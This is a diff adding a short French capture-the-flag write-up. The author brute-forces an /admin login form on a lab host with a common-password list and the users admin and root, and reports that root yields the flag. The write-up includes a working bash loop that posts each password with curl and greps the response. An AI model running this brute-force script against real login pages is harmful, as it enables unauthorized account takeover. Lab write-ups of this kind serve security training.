@@ -1,0 +1,9 @@
+ On voit un formulaire sur la page /admin. Jai essayer de le brute force avec une liste de mot de passe 
+ les plus utilises et l'user admin et root, avec root sa ma donner le flag !
+
+while IFS='' read -r line || [[ -n "$line" ]]; do
+	          echo "Password: $line \n";
+	          curl -d "username=root&password=$line&Login=Login" --dump-header headers http://192.168.100.129/admin/ | grep flag
+done < "$1"
+
+bash.sh filePassword. et on attend
